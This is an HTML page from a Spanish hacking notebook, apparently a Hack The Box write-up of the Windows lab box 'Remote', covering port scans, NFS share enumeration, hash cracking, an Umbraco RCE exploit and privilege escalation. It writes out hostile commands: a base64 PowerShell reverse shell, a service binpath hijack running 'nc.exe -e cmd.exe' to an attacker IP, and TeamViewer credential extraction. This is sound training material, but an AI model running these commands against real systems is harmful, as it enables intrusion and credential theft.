@@ -1,0 +1,408 @@
+<!DOCTYPE HTML>
+<html lang="es" class="sidebar-visible no-js ayu">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Remote - Secronomicón</title>
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../../../css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../../fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../../../index.html">Secronomicón</a></li><li class="chapter-item expanded affix "><li class="part-title">Guías / Cursos</li><li class="chapter-item expanded "><a href="../../../../../guides/oscp_bof/index.html"><strong aria-hidden="true">1.</strong> OSCP Buffer Overflow</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Port Swigger Academy</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/port_swigger_academy/sql_injection.html"><strong aria-hidden="true">2.1.</strong> SQL Injection</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/pwncollege/index.html"><strong aria-hidden="true">3.</strong> PwnCollege</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/pwncollege/0_module/index.html"><strong aria-hidden="true">3.1.</strong> Módulo 0</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/index.html"><strong aria-hidden="true">4.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/0_general.html"><strong aria-hidden="true">4.1.</strong> Teoría General</a></li><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/1_attacking.html"><strong aria-hidden="true">4.2.</strong> Atacando Active Directory</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/index.html"><strong aria-hidden="true">5.</strong> eCPPTv2 s4viLab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/1_aragog/index.html"><strong aria-hidden="true">5.1.</strong> Aragog</a></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/2_nagini/index.html"><strong aria-hidden="true">5.2.</strong> Nagini</a></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/3_fawkes/index.html"><strong aria-hidden="true">5.3.</strong> Fawkes</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.</strong> Matrix 1</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.5.</strong> Brainpan</div></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/nightmare/index.html"><strong aria-hidden="true">6.</strong> Nightmare</a></li><li class="chapter-item expanded affix "><li class="part-title">Misc</li><li class="chapter-item expanded "><a href="../../../../../templates/index.html"><strong aria-hidden="true">7.</strong> Templates</a></li><li class="chapter-item expanded affix "><li class="part-title">Cheat Sheets</li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/general.html"><strong aria-hidden="true">8.</strong> General</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/active_directory.html"><strong aria-hidden="true">9.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/network/general.html"><strong aria-hidden="true">10.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/network/pivoting.html"><strong aria-hidden="true">10.1.</strong> Pivoting</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> Pwning</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/pwning/linux.html"><strong aria-hidden="true">11.1.</strong> Linux pwning</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/pwning/bof-oscp.html"><strong aria-hidden="true">11.2.</strong> OSCP Buffer Overflow</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/fuzzing.html"><strong aria-hidden="true">12.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/inyecciones.html"><strong aria-hidden="true">13.</strong> Inyecciones</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/transfer.html"><strong aria-hidden="true">14.</strong> Transferencia de archivos</a></li><li class="chapter-item expanded affix "><li class="part-title">CTFs</li><li class="chapter-item expanded "><a href="../../../../../ctfs/20220922_ctf-core2022/index.html"><strong aria-hidden="true">15.</strong> 22/09/2022 - IPN Core 2022 CTF</a></li><li class="chapter-item expanded affix "><li class="part-title">Hack The Box</li><li class="chapter-item expanded "><div><strong aria-hidden="true">16.</strong> Battlegrounds</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/battlegrounds/mayhem/index.html"><strong aria-hidden="true">16.1.</strong> Cyber Mayhem</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">17.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.</strong> Boxes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.1.</strong> Fácil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.2.</strong> Medio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.3.</strong> Difícil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.4.</strong> Locura</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.1.</strong> Fácil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Active/index.html"><strong aria-hidden="true">18.2.1.1.</strong> Active</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Devel/index.html"><strong aria-hidden="true">18.2.1.2.</strong> Devel</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Remote/index.html" class="active"><strong aria-hidden="true">18.2.1.3.</strong> Remote</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Access/index.html"><strong aria-hidden="true">18.2.1.4.</strong> Access</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.2.</strong> Medio</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Chatterbox/index.html"><strong aria-hidden="true">18.2.2.1.</strong> Chatterbox</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Jeeves/index.html"><strong aria-hidden="true">18.2.2.2.</strong> Jeeves</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/SecNotes/index.html"><strong aria-hidden="true">18.2.2.3.</strong> SecNotes</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Silo/index.html"><strong aria-hidden="true">18.2.2.4.</strong> Silo</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.3.</strong> Difícil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/3_dificil/Control/index.html"><strong aria-hidden="true">18.2.3.1.</strong> Control</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/3_dificil/Search/index.html"><strong aria-hidden="true">18.2.3.2.</strong> Search</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.4.</strong> Locura</div></li></ol></li></ol></li><li class="chapter-item expanded "><li class="part-title">echoCTF</li><li class="chapter-item expanded "><div><strong aria-hidden="true">19.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">20.</strong> Networks</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.</strong> Targets</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">21.1.</strong> Principiante</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.2.</strong> Básico</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/2_basic/Flanders/index.html"><strong aria-hidden="true">21.2.1.</strong> Flanders</a></li><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/2_basic/Smithers/index.html"><strong aria-hidden="true">21.2.2.</strong> Smithers</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.3.</strong> Intermedio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.4.</strong> Avanzado</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.5.</strong> Experto</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/5_expert/gogo-yubari/index.html"><strong aria-hidden="true">21.5.1.</strong> Gogo Yubari</a></li><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/5_expert/hajmetr/index.html"><strong aria-hidden="true">21.5.2.</strong> Hajmetr</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.6.</strong> Guru</div></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Secronomicón</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="estadísticas"><a class="header" href="#estadísticas">Estadísticas</a></h1>
+<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
+<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/234">Remote</a></td></tr>
+<tr><td>OS</td><td>Windows</td></tr>
+<tr><td>Dificultad oficial</td><td>Easy</td></tr>
+<tr><td>Dificultad de comunidad</td><td><img src="images/difficulty.png" alt="Dificultad" /></td></tr>
+<tr><td>Puntos</td><td>20</td></tr>
+<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/2984">mrb3n</a></td></tr>
+</tbody></table>
+</div>
+<h1 id="reconocimiento"><a class="header" href="#reconocimiento">Reconocimiento</a></h1>
+<h2 id="escaneo-de-host"><a class="header" href="#escaneo-de-host">Escaneo de host</a></h2>
+<h3 id="escaneo-completo-de-puertos"><a class="header" href="#escaneo-completo-de-puertos">Escaneo completo de puertos</a></h3>
+<pre><code class="language-bash">└─$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 09:05 EDT
+Initiating SYN Stealth Scan at 09:05
+Scanning 10.10.10.180 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.180
+Discovered open port 111/tcp on 10.10.10.180
+Discovered open port 445/tcp on 10.10.10.180
+Discovered open port 135/tcp on 10.10.10.180
+Discovered open port 139/tcp on 10.10.10.180
+Discovered open port 21/tcp on 10.10.10.180
+Discovered open port 49664/tcp on 10.10.10.180
+Discovered open port 49665/tcp on 10.10.10.180
+Discovered open port 5985/tcp on 10.10.10.180
+Discovered open port 49667/tcp on 10.10.10.180
+Discovered open port 49678/tcp on 10.10.10.180
+Discovered open port 47001/tcp on 10.10.10.180
+Discovered open port 49680/tcp on 10.10.10.180
+Discovered open port 49666/tcp on 10.10.10.180
+Discovered open port 49679/tcp on 10.10.10.180
+Discovered open port 2049/tcp on 10.10.10.180
+Completed SYN Stealth Scan at 09:05, 13.25s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.180
+Host is up, received user-set (0.068s latency).
+Scanned at 2022-06-02 09:05:13 EDT for 13s
+Not shown: 65519 closed tcp ports (reset)
+PORT      STATE SERVICE      REASON
+21/tcp    open  ftp          syn-ack ttl 127
+80/tcp    open  http         syn-ack ttl 127
+111/tcp   open  rpcbind      syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+2049/tcp  open  nfs          syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+47001/tcp open  winrm        syn-ack ttl 127
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49678/tcp open  unknown      syn-ack ttl 127
+49679/tcp open  unknown      syn-ack ttl 127
+49680/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds
+           Raw packets sent: 65924 (2.901MB) | Rcvd: 65535 (2.621MB)
+</code></pre>
+<h3 id="escaneo-específico"><a class="header" href="#escaneo-específico">Escaneo específico</a></h3>
+<pre><code class="language-bash">└─$ nmap -sCV -p 21,80,111,135,139,445,2049,5985,47001,49664,49665,49666,49667,49678,49679,49680 -n -Pn -oN nmap/targeted $TARGET
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 09:08 EDT
+Nmap scan report for 10.10.10.180
+Host is up (0.064s latency).
+
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst:
+|_  SYST: Windows_NT
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Home - Acme Widgets
+111/tcp   open  rpcbind       2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+2049/tcp  open  mountd        1-3 (RPC #100005)
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49678/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49680/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2022-06-02T13:09:19
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 102.15 seconds
+</code></pre>
+<h1 id="enumeración"><a class="header" href="#enumeración">Enumeración</a></h1>
+<h2 id="servicios"><a class="header" href="#servicios">Servicios</a></h2>
+<h3 id="http---80"><a class="header" href="#http---80">http - 80</a></h3>
+<h4 id="ffuf"><a class="header" href="#ffuf">ffuf</a></h4>
+<p>Al navegar a través del sitio disponible y no encontrar información relevante en primera instancia, se decidió enumerar directorios de manera automática mediante:</p>
+<pre><code class="language-bash">ffuf -c -ic -u http://10.10.10.180/FUZZ -w /usr/share/dirb/wordlists/common.txt
+</code></pre>
+<p>Encontrando así el directorio <code>umbraco</code> el cual no pareció común bajo el contexto del sitio.</p>
+<p><img src="images/enum_1.png" alt="Directorio encontrado" /></p>
+<h4 id="manual"><a class="header" href="#manual">Manual</a></h4>
+<p>Al navegar manualmente al directorio se visualizó un login, a lo que posteriormente se buscó información relacionada encontrando que se trataba de un sistema de gestor de contenidos (CMS).</p>
+<p><img src="images/enum_2.png" alt="Navegación a umbraco" /></p>
+<p>Al buscar rutas de explotación se encontró un <a href="https://www.exploit-db.com/exploits/49488">exploit</a> (junto con <a href="https://github.com/noraj/Umbraco-RCE">su repositorio</a>) el cuál para ser ejecutado se requiere contar con credenciales válidas, abriendo paso a dos consideraciones de camino a la fase de explotación:</p>
+<ul>
+<li>Realizar búsqueda de credenciales por algún sitio <em>(preferente)</em>.</li>
+<li>Realizar fuerza bruta al login <em>(siempre último recurso)</em>.</li>
+</ul>
+<h3 id="mountd---2049"><a class="header" href="#mountd---2049">mountd - 2049</a></h3>
+<p>Al identificar el servicio y encontrar que se trataba de exposición de puntos de montaje a través de red, se hizo uso de <code>showmount -e 10.10.10.180</code> visualizando así el montaje <code>site_backups</code>.</p>
+<p><img src="images/enum_3.png" alt="Puntos de montaje disponibles" /></p>
+<p>Posteriormente, para poder navegar a través del directorio e interactuar cómodamente se creó la carpeta <code>/mnt/remote</code> y se ejecutó:</p>
+<pre><code class="language-bash">sudo mount -t nfs 10.10.10.180:site_backups /mnt/remote -o nolock
+</code></pre>
+<p>Para montar ahí lo expuesto en el servidor.</p>
+<p>Teniendo en consideración la búsqueda de credenciales, se buscaron patrones en texto claro en el punto de montaje.</p>
+<p><img src="images/enum_4.png" alt="Búsqueda de password" /></p>
+<p>Al buscar en los contenidos de los archivos señalados (los que resultaron más atractivos) se encontró en el archivo <code>UmbracoTraceLog.intranet.txt</code> un usuario potencial que se utilizó para continuar con la búsqueda de información.</p>
+<p><img src="images/enum_5.png" alt="Correo expuesto" /></p>
+<p>Utilizando lo encontrado, se procedió a hacer otra búsqueda descartando así múltiples archivos permitiendo verificar otros que con anterioridad no se revisaron.</p>
+<p><img src="images/enum_6.png" alt="Descarte de archivos" /></p>
+<p>Al ser interpretado como binario, se uso:</p>
+<pre><code class="language-bash">strings Umbraco.pdf
+</code></pre>
+<p>Para interpretar los caracteres legibles identificando así las credenciales <code>admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa</code>.</p>
+<p><img src="images/enum_7.png" alt="Credenciales expuestas" /></p>
+<h1 id="explotación"><a class="header" href="#explotación">Explotación</a></h1>
+<h2 id="cracking-de-hash-obtenido"><a class="header" href="#cracking-de-hash-obtenido">Cracking de hash obtenido</a></h2>
+<p>Guardando el hash del usuario admin en un archivo y haciendo uso de:</p>
+<pre><code class="language-bash">john hashes --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre>
+<p>Se obtuvo la contraseña <code>admin@htb.local:baconandcheese</code>.</p>
+<p><img src="images/exploit_1.png" alt="Crackeo de hash" /></p>
+<h2 id="rce"><a class="header" href="#rce">RCE</a></h2>
+<p>Después de validar las credenciales con el portal de umbraco y descargar el exploit previamente encontrado, se ejecutó:</p>
+<pre><code class="language-bash">python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c whoami
+</code></pre>
+<p>Para corroborar su uso.</p>
+<p><img src="images/exploit_2.png" alt="Ejecución de comando whoami" /></p>
+<p>Haciendo uso de <a href="https://www.revshells.com/">Reverse Shell Generator</a> se generó una reverse shell de powershell en base64 para entablar la conexión con:</p>
+<pre><code class="language-bash">python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-e JABjAGwAaQBlAG4AdAAg[...]'
+</code></pre>
+<p><img src="images/exploit_3.png" alt="Reverse shell" /></p>
+<h1 id="post-explotación"><a class="header" href="#post-explotación">Post Explotación</a></h1>
+<h2 id="enumeración-1"><a class="header" href="#enumeración-1">Enumeración</a></h2>
+<p>Verificando los privilegios que se tienen con el usuario obtenido haciendo uso de:</p>
+<pre><code class="language-powershell">whoami /all
+</code></pre>
+<p>Se visualizó que el privilegio <code>SeImpersonatePrivilege</code> se encuentra habilitado, permitiendo su explotación haciendo uso de Rotten/JuicyPotato.</p>
+<p><img src="images/post_1.png" alt="SeImpersonatePrivilege habilitado" /></p>
+<p>Por medio de <a href="https://github.com/carlospolop/PEASS-ng">winPEAS</a> se encontró que el servicio de <code>TeamViewer</code> se encuentra habilitado y ejecutándose. Concordando de alguna forma con el nombre de la máquina.</p>
+<p><img src="images/post_2.png" alt="Servicio TeamViewer habilitado" /></p>
+<p>Posteriormente, se realizó una búsqueda sobre los exploits disponibles sobre TeamViewer encontrando los siguientes.</p>
+<p><img src="images/post_3.png" alt="Exploits disponibles de TeamViewer" /></p>
+<p>En donde por curiosidad se tomó en consideración la exposición de credenciales y búscando más información al respecto se encontró el módulo de metasploit <code>windows/gather/credentials/teamviewer_passwords</code> y un <a href="https://github.com/zaphoxx/WatchTV">repositorio</a> en conjunto con <a href="https://whynotsecurity.com/blog/teamviewer/">su artículo</a> en donde se realiza una PoC para descifrar las credenciales alojadas en registros de Windows.</p>
+<p>También dentro de la salida de <code>winPEAS</code> se visualiza que se cuenta con acceso completo al servicio <code>UsoSvc</code>, lo que permitiría modificar las opciones del servicio y detener o iniciar su ejecución.</p>
+<p><img src="images/post_4.png" alt="Permisos de servicio UsoSvc" /></p>
+<h2 id="escalación-de-privilegios"><a class="header" href="#escalación-de-privilegios">Escalación de privilegios</a></h2>
+<h3 id="iis-apppool--nt-authority-system"><a class="header" href="#iis-apppool--nt-authority-system">iis apppool → nt authority system</a></h3>
+<h4 id="teamviewer"><a class="header" href="#teamviewer">TeamViewer</a></h4>
+<p>Al subir el script de powershell a la máquina, cargarlo como módulo en la sesión con <code>Import-Module</code> y ejecutar la función de extración <code>Get-TeamViewPasswords</code>, se descifró la contraseña <code>!R3m0te!</code>.</p>
+<p><img src="images/post_5.png" alt="Extracción de contraseña" /></p>
+<p><em>El mismo proceso puede ser realizado con el módulo de metasploit, sin embargo, es necesario tener una sesión abierta preferentemente de meterpreter (al tiempo que se resolvió la máquina el payload ejecutado fue <code>windows/meterpreter_reverse_tcp</code>)</em></p>
+<p>Probando posteriormente la contraseña con el usuario Administrator mediante:</p>
+<pre><code class="language-bash">impacket-psexec 'Administrator:!R3m0te!@10.10.10.180'
+</code></pre>
+<p>Obteniendo así acceso como <code>NT AUTHORITY\SYSTEM</code>.</p>
+<p><img src="images/post_6.png" alt="Acceso como nt authority system" /></p>
+<h4 id="modificación-de-servicios"><a class="header" href="#modificación-de-servicios">Modificación de servicios</a></h4>
+<p>Mediante:</p>
+<pre><code class="language-powershell">sc.exe qc UsoSvc
+</code></pre>
+<p>Se puede ver más a detalle información respecto este servicio.</p>
+<p><img src="images/post_7.png" alt="Información de servicio UsoSvc" /></p>
+<p>Por lo que haciendo uso de:</p>
+<pre><code class="language-powershell">sc.exe config UsoSvc binpath=&quot;c:\windows\temp\nc.exe -e cmd.exe 10.10.14.16 4321&quot;
+</code></pre>
+<p>Se buscó la modificación de la ruta del binario a ejecutar sustituyéndola con la ejecución de netcat para entablar una reverse shell. Al consultar de nuevo la información del servicio, se observa la modificación del valor.</p>
+<p><img src="images/post_8.png" alt="Cambio de ruta de binario" /></p>
+<p>Por consiguiente al poner la conexión a la escucha y  realizar un reinicio del servicio con:</p>
+<pre><code class="language-powershell">net stop UsoSvc &amp;&amp; net start UsoSvc
+</code></pre>
+<p>Se logró tener acceso como <code>NT AUTHORITY\SYSTEM</code> satisfactoriamente.</p>
+<p><img src="images/post_9.png" alt="Acceso como nt authority system" /></p>
+<h4 id="juicypotato"><a class="header" href="#juicypotato">JuicyPotato</a></h4>
+<p>Debido al no tener éxito al aprovecharse del privilegio ni con el uso de <a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a> ni con <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> se buscó corroborar con el writeup oficial, el cuál indica que debería ser válido el método, sin embargo, no se logró satisfactoriamente.</p>
+<h1 id="referencias"><a class="header" href="#referencias">Referencias</a></h1>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/49488">Exploit de Umbraco</a>.</li>
+<li><a href="https://github.com/noraj/Umbraco-RCE">Github - Exploit de Umbraco</a>.</li>
+<li><a href="https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting">HackTricks - Pentesting NFS Service</a>.</li>
+<li><a href="https://docs.microsoft.com/en-us/powershell/scripting/developer/module/importing-a-powershell-module?view=powershell-7.2">Microsoft - Importación de módulo en powershell</a>.</li>
+<li><a href="https://github.com/zaphoxx/WatchTV">Github - Descifrado de contraseñas TeamViewer</a>.</li>
